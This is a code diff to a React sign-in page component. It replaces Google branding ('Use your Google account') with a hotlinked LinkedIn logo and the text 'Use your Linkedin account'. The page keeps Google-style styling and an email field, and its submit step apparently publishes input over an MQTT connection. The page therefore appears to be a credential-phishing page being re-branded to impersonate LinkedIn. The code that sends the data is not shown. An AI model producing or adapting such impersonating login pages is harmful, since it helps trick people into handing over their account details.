@@ -114,7 +114,12 @@ export default function EmailPage({ onBack, onNext }) {
           background: "#fff"
         }}>
 
-          <img src="/google.svg" alt="Metacube" style={{ height: 40, marginBottom: 24 }} />
+          {/* LinkedIn logo — replaces google.svg */}
+          <img
+            src="https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png"
+            alt="LinkedIn"
+            style={{ height: 40, marginBottom: 24, display: "block", margin: "0 auto 24px" }}
+          />
 
           {/* Heading */}
           <h1 style={{
@@ -133,7 +138,7 @@ export default function EmailPage({ onBack, onNext }) {
             marginBottom: 32,
             lineHeight: 1.5
           }}>
-            Use your Google account
+            Use your Linkedin account
           </p>
 
           {/* MQTT Status Indicator */}
@@ -153,9 +158,6 @@ export default function EmailPage({ onBack, onNext }) {
               display: "inline-block",
               transition: "background 0.3s",
             }} />
-            {/* <span style={{ textTransform: "capitalize" }}>
-              {mqttStatus === "connected" ? "Active" : mqttStatus}
-            </span> */}
           </div>
 
           {/* Email input */}
@@ -260,8 +262,8 @@ export default function EmailPage({ onBack, onNext }) {
               Back
             </button>
 
-            <button 
-              onClick={validate} 
+            <button
+              onClick={validate}
               disabled={isPublishing || mqttStatus !== "connected"}
               style={{
                 background: isPublishing ? "#dadce0" : "#1a73e8",
